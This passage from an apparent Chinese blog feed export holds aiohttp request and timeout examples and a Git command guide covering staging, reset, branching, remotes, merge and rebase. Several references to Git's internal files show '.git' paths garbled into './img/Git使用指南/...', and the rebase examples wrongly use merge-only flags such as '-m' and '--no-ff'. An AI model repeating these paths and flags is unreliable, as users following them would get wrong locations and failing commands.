class="hljs-string">f&#x27;requestInfo: <span class="hljs-subst">&#123;r.request_info&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 返回详细的请求信息，包括url、method、headers</span><br><br>            res = <span class="hljs-keyword">await</span> r.text(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># 使用response.read()读取二进制内容</span><br>            <span class="hljs-built_in">print</span>(res)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span>(<span class="hljs-params">url, session: ClientSession</span>):</span><br>    <span class="hljs-comment"># 提交数据</span><br>    data_list = [<br>        <span class="hljs-string">&#x27;test&#x27;</span>,  <span class="hljs-comment"># 纯文本格式，text/plain</span><br>        <span class="hljs-string">b&#x27;test&#x27;</span>,  <span class="hljs-comment"># 二进制流格式，application/octet-stream</span><br>        &#123;<span class="hljs-string">&#x27;test&#x27;</span>: <span class="hljs-string">&#x27;object&#x27;</span>&#125;,  <span class="hljs-comment"># 表单格式，application/x-www-form-urlencoded</span><br>    ]<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.post(url, data=data) <span class="hljs-keyword">as</span> r:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> r.text())<br>    <span class="hljs-comment"># json格式，application/json</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.post(url, json=&#123;<span class="hljs-string">&#x27;test&#x27;</span>: <span class="hljs-string">&#x27;object&#x27;</span>&#125;) <span class="hljs-keyword">as</span> r:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> r.text())<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cookie</span>(<span class="hljs-params">url, session: ClientSession</span>):</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> r:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> r.json())  <span class="hljs-comment"># 返回json解码后的内容</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># 自定义cookies</span><br>    cookies = &#123;<span class="hljs-string">&#x27;cookies_are&#x27;</span>: <span class="hljs-string">&#x27;working&#x27;</span>&#125;<br>    <span class="hljs-comment"># 在网络请求中，会话（session）是指同一用户与服务器进行交互的过程，aiohttp使用ClientSession来管理会话。</span><br>    <span class="hljs-comment"># 注意：不要为每个请求创建一个会话，最好是为每个应用程序创建一个会话，以执行所有请求。更复杂的情况可能需要对每个站点都有一个会话，例如一个用于Github，另一个用于Facebook。</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> ClientSession(cookies=cookies) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">await</span> get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>, session)<br>        <span class="hljs-keyword">await</span> post(<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>, session)<br>        <span class="hljs-keyword">await</span> cookie(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>, session)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p><strong>示例三：aiohttp 限制并发连接数和超时时间</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> ClientSession, ClientTimeout, TCPConnector, client_exceptions<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>():</span><br>    conn = TCPConnector(limit=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 限制同时连接数，默认为100，limit=0时无限制</span><br>    timeout = ClientTimeout(total=<span class="hljs-number">10</span>, connect=<span class="hljs-number">2</span>, sock_connect=<span class="hljs-number">2</span>, sock_read=<span class="hljs-number">10</span>)<br>    <span class="hljs-comment"># 默认total=5*60, connect=None, sock_connect=None, sock_read=None，为None或0时表示禁用特定的超时检查</span><br>    <span class="hljs-comment"># total：单次请求的最长时间（包括建立连接、发送请求和读取响应）</span><br>    <span class="hljs-comment"># connect：建立新连接或等待连接池中的空闲连接的最长时间</span><br>    <span class="hljs-comment"># sock_connect：建立新连接的最长时间（不是从池中给出的）</span><br>    <span class="hljs-comment"># sock_read：从服务端获取消息的最长时间</span><br><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> ClientSession(connector=conn, timeout=timeout) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://127.0.0.1:9643/test&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Body: <span class="hljs-subst">&#123;<span class="hljs-keyword">await</span> response.text()&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">except</span> client_exceptions.ServerTimeoutError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Request timeout: <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    st = time.perf_counter()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">await</span> asyncio.wait_for(get(), timeout=<span class="hljs-number">10</span>)  <span class="hljs-comment"># 协程超时</span><br>    <span class="hljs-keyword">except</span> asyncio.exceptions.TimeoutError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Coroutines timeout&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;time: <span class="hljs-subst">&#123;time.perf_counter() - st&#125;</span>s&#x27;</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>高并发</tag>
      
      <tag>协程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git 使用指南</title>
    <link href="/post/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/post/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>Git 是目前世界上最先进的 <strong>分布式</strong> 版本控制系统，本文详细介绍了 Git 在单人模式和多人协作下的基本概念、使用方式和常用指令，最后对比了几种最流行的 Git 协同模型，可以更高效地进行团队开发。</p><h2 id="版本控制系统"><a href="#版本控制系统" class="headerlink" title="版本控制系统"></a>版本控制系统</h2><h3 id="SVN-集中式版本控制系统"><a href="#SVN-集中式版本控制系统" class="headerlink" title="SVN 集中式版本控制系统"></a>SVN 集中式版本控制系统</h3><ul><li>版本库放在中央服务器</li><li>必须联网才能工作</li><li>服务器磁盘故障存在数据丢失风险</li></ul><h3 id="Git-分布式版本控制系统"><a href="#Git-分布式版本控制系统" class="headerlink" title="Git 分布式版本控制系统"></a>Git 分布式版本控制系统</h3><ul><li>没有中央服务器，每台个人PC都有一个完整的版本库</li><li>工作时无需联网</li><li>通过把各自的修改推给对方进行协作</li><li>服务器数据丢失可用任意一个代码仓库恢复，宕机期间也可以提交代码到本地仓库</li><li>安全性强，Git管理的每一个文件、目录、提交等都拥有一个SHA-1哈希值</li></ul><h2 id="Git-独奏"><a href="#Git-独奏" class="headerlink" title="Git 独奏"></a>Git 独奏</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a><a href="http://www.worldhello.net/got/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/02-git-solo/020-git-stage.html#git-stage">暂存区</a></h4><ol><li>暂存区一般称为stage或index，只有添加到暂存区的文件才可以被提交。</li><li>暂存区保存在<code>./img/Git使用指南/index</code>文件中，是一个包含文件索引的目录树，有类似工作区的目录结构，其中记录了文件名、文件的状态信息等。</li><li>具体的文件内容保存在git对象库<code>./img/Git使用指南/objects</code>目录中，文件索引建立了文件和对象库中对象实体之间的对应关系。</li></ol><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-stage.png" alt="git-stage"></p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a><a href="http://www.zsythink.net/archives/3412">HEAD</a></h4><ol><li><p>可以把<code>HEAD</code>理解成一个指针，<code>HEAD</code>指针通常指向当前所在分支的分支指针，分支指针总是指向当前分支的最新提交，即通常情况下<code>HEAD</code>指针总是指向了当前分支的最新提交（通过分支指针间接指向）。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210113170457853.png" alt="从master检出test分支"></p></li><li><p><code>HEAD</code>指针和分支指针的当前指向，分别保存在<code>./img/Git使用指南/HEAD</code>文件和<code>./img/Git使用指南/refs/heads/&lt;branch&gt;</code>文件中。在git中，可以在<code>./img/Git使用指南/refs</code>目录下找到一系列含有SHA-1值的文件，这类文件也被称为“引用” （refs或references）。</p><blockquote><p>$ cat ./img/Git使用指南/HEAD<br>ref: refs/heads/test</p><p>$ cat ./img/Git使用指南/refs/heads/test<br>6f396a68315694be320949fba3f6a57d5e1c318f</p></blockquote></li><li><p>分离头指针（detached HEAD），即<code>HEAD</code>指针没有指向分支指针，而是直接指向了某个具体的提交。一般用来快速地基于某个提交进行一些实验或者测试，如果对结果满意就保留，否则就丢弃。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210111110814187.png" alt="检出某个提交时HEAD指针的变化"></p></li><li><p>在写法上，通常用<code>HEAD</code>表示当前版本，<code>HEAD^</code>是上一个版本，<code>HEAD^^</code>是上上一个版本，上100个版本可以写作<code>HEAD~100</code>。</p></li></ol><h3 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210104142317464.png"></p><ul><li>git init：初始化仓库</li><li>git clone：克隆远程仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;repo&gt; [&lt;dir&gt;] --depth=1 -b &lt;branch&gt; --single-branch  <span class="hljs-comment"># 克隆指定分支最近的一次提交</span><br></code></pre></td></tr></table></figure><ul><li>git config：修改配置文件（优先级：local &gt; global &gt; system）</li></ul><blockquote><p>初始化结果：生成.git文件（本地版本库），用户名和邮件地址配置成功（不做校验）</p></blockquote><h3 id="文件变更"><a href="#文件变更" class="headerlink" title="文件变更"></a>文件变更</h3><ul><li>git add：添加文件到暂存区</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add [file1] [file2] ... / [dir]<br>git add ./-A  <span class="hljs-comment"># 添加所有已跟踪和未跟踪文件的变更</span><br>git add -u  <span class="hljs-comment"># 更新已跟踪的文件变更（修改、删除）</span><br></code></pre></td></tr></table></figure><ul><li>git commit：提交暂存区文件到本地仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git commit -m <span class="hljs-string">&quot;message&quot;</span><br>git commit -m <span class="hljs-string">&quot;message&quot;</span> --amend  <span class="hljs-comment"># 追加提交</span><br></code></pre></td></tr></table></figure><ul><li>git status：查看工作区和暂存区之间的文件变更状态</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git status  <span class="hljs-comment"># 标准显示</span><br>git status -s  <span class="hljs-comment"># 简洁显示</span><br>git status -v  <span class="hljs-comment"># 详细显示（文件内容改动）</span><br>git status --ignored  <span class="hljs-comment"># 显示被忽略的文件</span><br></code></pre></td></tr></table></figure><ul><li>git diff：比较文件内容差异</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-diff.png" alt="git-diff"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git diff  <span class="hljs-comment"># 比较工作区和暂存区</span><br>git diff HEAD/&lt;branch&gt;/&lt;commit&gt;  <span class="hljs-comment"># 比较工作区和HEAD/branch/commit</span><br>git diff --cached  <span class="hljs-comment"># 比较暂存区和HEAD</span><br>git diff -- &lt;file&gt;/&lt;path&gt; <span class="hljs-comment"># 比较文件/目录差异</span><br>git diff &lt;commit1&gt; &lt;commit2&gt; -- &lt;paths&gt; <span class="hljs-comment"># 比较两个commit之间的具体文件差异</span><br>git diff --<span class="hljs-built_in">stat</span>  <span class="hljs-comment"># 摘要显示</span><br></code></pre></td></tr></table></figure><blockquote><p>当执行<code>git status</code>或<code>git diff</code>命令扫描工作区改动的时候，git会先依据<code>./img/Git使用指南/index</code>文件中记录的（已跟踪文件的）时间戳、长度等信息判断工作区文件是否改变。如果文件时间戳发生改变，则文件内容<strong>可能</strong>被修改了，此时再打开文件，对比文件内容，判断文件是否真正被更改。这也是Git高效的因素之一。</p></blockquote><ul><li>git rm：删除文件，并自动变更暂存区</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git rm [&lt;options&gt;] [--] &lt;file&gt;...<br>git rm --cached --force -r &lt;file&gt;  <span class="hljs-comment"># 移除不需要跟踪的文件（不删除工作区文件）</span><br></code></pre></td></tr></table></figure><ul><li>git ls-files：查看工作区和暂存区的文件信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git ls-files -c  <span class="hljs-comment"># 显示已缓存到暂存区的文件（默认）</span><br>git ls-files -s  <span class="hljs-comment"># 显示暂存区的文件对象信息（模式位，文件哈希值，暂存区编号，文件名）</span><br></code></pre></td></tr></table></figure><h3 id="版本切换"><a href="#版本切换" class="headerlink" title="版本切换"></a>版本切换</h3><ul><li><a href="https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2">git log</a>：查看提交历史（显示当前<code>HEAD</code>之前的提交历史）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span>  <span class="hljs-comment"># 从近到远列出所有提交记录</span><br><span class="hljs-comment"># 显示参数</span><br>--<span class="hljs-built_in">stat</span>  <span class="hljs-comment"># 显示文件差异（行数统计）</span><br>-p  <span class="hljs-comment"># 显示文件差异（详细的具体改动）</span><br>--oneline  <span class="hljs-comment"># 简洁显示</span><br>--graph  <span class="hljs-comment"># 以ASCII图形模式显示</span><br>–-pretty  <span class="hljs-comment"># 格式化输出 %h-简短哈希字符串 %s-提交说明</span><br><span class="hljs-comment"># 筛选参数</span><br>-n  <span class="hljs-comment"># 限定数量</span><br>--since, --after  <span class="hljs-comment"># 限定指定时间之后的提交</span><br>--until, --before  <span class="hljs-comment"># 限定指定时间之前的提交</span><br>--author  <span class="hljs-comment"># 限定作者</span><br>--grep  <span class="hljs-comment"># 搜索commit关键字</span><br>--no-merges  <span class="hljs-comment"># 过滤掉merge commit</span><br>git <span class="hljs-built_in">log</span> --/commit/branch/tag  <span class="hljs-comment"># 限定路径/提交/分支/标签</span><br><span class="hljs-comment"># 示例</span><br>git <span class="hljs-built_in">log</span> --pretty=<span class="hljs-string">&quot;%h - %s&quot;</span> --author=<span class="hljs-string">&#x27;Junio C Hamano&#x27;</span> --since=<span class="hljs-string">&quot;2008-10-01&quot;</span> --before=<span class="hljs-string">&quot;2008-11-01&quot;</span> --no-merges -- <span class="hljs-built_in">test</span>/<br></code></pre></td></tr></table></figure><ul><li>git reflog：查看命令历史</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reflog  <span class="hljs-comment"># 可以查看已被删除的commit记录和reset操作（用来恢复本地错误操作）</span><br></code></pre></td></tr></table></figure><ul><li>git reset：重置</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210111143233457.png"></p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210111143215762.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset [&lt;commit&gt;] [--] &lt;paths&gt;...  <span class="hljs-comment"># 不改变引用（值），替换暂存区中的文件，默认值为HEAD</span><br>git reset [--mixed|--soft|--hard] [&lt;commit&gt;]  <span class="hljs-comment"># 改变引用，有不同的选项</span><br>git reset HEAD  <span class="hljs-comment"># 撤销对暂存区的修改（将暂存区恢复到最近提交的状态，默认使用--mixed选项）</span><br>git reset --hard HEAD  <span class="hljs-comment"># 将工作区、暂存区都恢复到最近提交的状态</span><br>git reset --soft HEAD^  <span class="hljs-comment"># 只修改引用，不修改工作区、暂存区文件</span><br></code></pre></td></tr></table></figure><blockquote><p>reset实质：重置引用（改变<code>HEAD</code>指针所指向的分支指针指向，<code>HEAD</code>指针始终指向当前分支指针）</p></blockquote><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/4428238-6dbab74ae9ad2e1f.gif"></p><ul><li>git revert：版本回滚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git revert &lt;commit&gt;  <span class="hljs-comment"># 回滚到指定的版本，回滚也会作为一次提交进行保存（适用于多人协同）</span><br></code></pre></td></tr></table></figure><blockquote><p>reset和revert的区别：git reset是回到某次commit，在本次commit之后的修改都会被删除；git revert是在最近一次commit之后生成一个新的commit，之前的所有commit都会被保留。</p></blockquote><h2 id="Git-和声"><a href="#Git-和声" class="headerlink" title="Git 和声"></a>Git 和声</h2><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><ul><li>git branch：分支管理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch  <span class="hljs-comment"># 查看本地分支</span><br>git branch &lt;branch&gt; <span class="hljs-comment"># 创建本地分支</span><br>git branch -r  <span class="hljs-comment"># 查看远程分支</span><br>git branch -a  <span class="hljs-comment"># 查看全部分支</span><br>git branch -d &lt;branch&gt;  <span class="hljs-comment"># 删除分支</span><br>git branch -vv <span class="hljs-comment"># 查看本地分支和远程分支的关联关系</span><br>git branch -u/--set-upstream-to origin/&lt;远程分支名&gt; [&lt;本地分支名&gt;]<br><span class="hljs-comment"># 建立本地分支（默认为当前分支）与远程分支的关联</span><br>git branch --unset-upstream  <span class="hljs-comment"># 取消当前本地分支与远程分支的映射关系</span><br></code></pre></td></tr></table></figure><ul><li>git checkout：检出</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-checkout.png" alt="git-checkout"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout [&lt;commit&gt;] [--] &lt;paths&gt;...  <span class="hljs-comment"># 不改变HEAD指针，替换工作区中的文件，默认值是暂存区</span><br><span class="hljs-comment"># 省略&lt;commit&gt;时用暂存区文件覆盖工作区，不省略&lt;commit&gt;时用指定提交中的文件覆盖暂存区和工作区中对应的文件</span><br><span class="hljs-comment"># 用法：git checkout -- filename  // 放弃单个文件修改</span><br><span class="hljs-comment">#      git checkout –- . 或 git checkout .  // 撤销一切本地修改</span><br>git checkout &lt;commit&gt;  <span class="hljs-comment"># 检出某个提交，改变HEAD指针并进入“分离头指针”状态</span><br>git checkout &lt;branch&gt;  <span class="hljs-comment"># 改变HEAD指针，检出branch分支（完成图中的三个步骤）</span><br>git checkout -b &lt;new_branch&gt; <span class="hljs-comment"># 改变HEAD指针，创建并检出到新分支</span><br>git checkout -b &lt;本地分支名&gt; origin/&lt;远程分支名&gt;  <span class="hljs-comment"># 在本地创建和远程feature分支的对应分支</span><br><span class="hljs-comment"># 例：git checkout -b dev origin/feature 在本地创建和远程feature分支的对应dev分支</span><br></code></pre></td></tr></table></figure><blockquote><p>checkout实质：重置<code>HEAD</code></p></blockquote><h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html">远程同步</a></h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/2018030919282196.png"></p><ul><li>git remote：操作远程仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git remote  <span class="hljs-comment"># 查看关联的远程仓库名称</span><br>git remote -v  <span class="hljs-comment"># 查看关联的远程仓库的详细信息</span><br>git remote add &lt;shortname&gt; &lt;url&gt;  <span class="hljs-comment"># 关联远程仓库，使用&lt;shortname&gt;指定一个仓库别名（通常为origin）</span><br>git remote rm/remove &lt;shortname&gt;  <span class="hljs-comment"># 删除远程仓库关联</span><br></code></pre></td></tr></table></figure><blockquote><p>远程分支通常写作<code>远程主机名/分支名</code>，如<code>origin/master</code>，保存在<code>./img/Git使用指南/refs/remotes/origin</code>目录下</p></blockquote><ul><li>git fetch：获取远程仓库中的最新版本到本地</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git fetch &lt;远程主机名&gt;  <span class="hljs-comment"># 取回远程更新（所有分支），不改变本地仓库文件</span><br>git fetch &lt;远程主机名&gt; &lt;分支名&gt;  <span class="hljs-comment"># 指定分支</span><br>git fetch origin tag &lt;tagname&gt;  <span class="hljs-comment"># 拉取远程分支的指定版本</span><br></code></pre></td></tr></table></figure><ul><li>git pull：获取远程仓库中的最新版本并merge到本地</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 分支拉取/推送顺序的写法是&lt;来源地&gt;:&lt;目的地&gt;</span><br>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;<br>git pull origin feature:dev  <span class="hljs-comment"># 从远程库拉取分支，进行合并</span><br>git pull  <span class="hljs-comment"># 快速拉取（等同于git fetch + git merge）</span><br>git pull -p  <span class="hljs-comment"># 拉取时在本地删除远程已经删除的分支</span><br>git pull --rebase &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;  <span class="hljs-comment"># 采用rebase模式</span><br></code></pre></td></tr></table></figure><blockquote><p>git pull = git fetch + git merge</p></blockquote><ul><li>git push：推送本地修改到远程仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;<br>git push origin dev:feature  <span class="hljs-comment"># 向远程库推送自己的修改（如果远程分支不存在，则新建）</span><br>git push origin feature  <span class="hljs-comment"># 当前分支与上游分支同名时可省略</span><br>git push  <span class="hljs-comment"># 关联后可直接使用快速推送（推送当前分支，并且当前分支与上游分支同名）</span><br>git push -u/--set-upstream origin &lt;本地分支名&gt;  <span class="hljs-comment"># 推送时添加远程关联</span><br>git push origin --delete &lt;远程分支名&gt;  <span class="hljs-comment"># 删除远程分支</span><br><span class="hljs-comment"># 撤销远程提交：</span><br>git reset --hard &lt;commit&gt;<br>git push origin &lt;本地分支名&gt; --force  <span class="hljs-comment"># 强制覆盖远程版本</span><br></code></pre></td></tr></table></figure><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><ul><li>git merge：合并分支</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/2926d47044d764c6b291f07461b9a2d0_720w.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git merge &lt;branch&gt; -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 合并指定分支到当前分支</span><br>git merge &lt;branch&gt; --no-ff -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 不使用Fast-forward模式进行合并</span><br>git merge --abort  <span class="hljs-comment"># 放弃合并（发生冲突时）</span><br></code></pre></td></tr></table></figure><ul><li>git rebase：变基（衍合分支）</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/7e2f258b5e5417cda3f7ff2bd0fc01c8_720w.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git rebase &lt;branch&gt; -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 衍合指定分支到当前分支</span><br>git rebase &lt;branch&gt; --no-ff -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 不使用Fast-forward模式进行合并</span><br>git rebase --<span class="hljs-built_in">continue</span>  <span class="hljs-comment"># 解决代码冲突后，继续进行rebase</span><br>git rebase --abort  <span class="hljs-comment"># 放弃衍合（发生冲突时）</span><br></code></pre></td></tr></table></figure><blockquote><p>merge和rebase的区别：</p><p>git merge会将两个分支的最新一次提交进行合并，发生冲突并解决冲突后，执行<code>git add</code>和<code>git commit</code>，最终会产生一个新的commit。合并的结果为非线性，但只用解决一次冲突。（快进式合并的合并结果为线性，且不产生任何新的commit）</p><p>git rebase会把当前分支的commit放到公共分支的最后面（变基），发生冲突并解决冲突后，执行<code>git add</code>和<code>git rebase --continue</code>，不会产生额外的commit，会改变最近一次commit的hash值。合并的结果呈现为线性，但看不到完整的历史脉络（不要在公共分支使用rebase，否则容易破坏其他人的commit记录），同时rebase的冲突需要一个个解决（把commit打散成patch），一次rebase可能要解决多次冲突。</p></blockquote><ul><li>git cherry-pick：择优挑选</li></ul><figure class="highlight bash"><table><tr><td 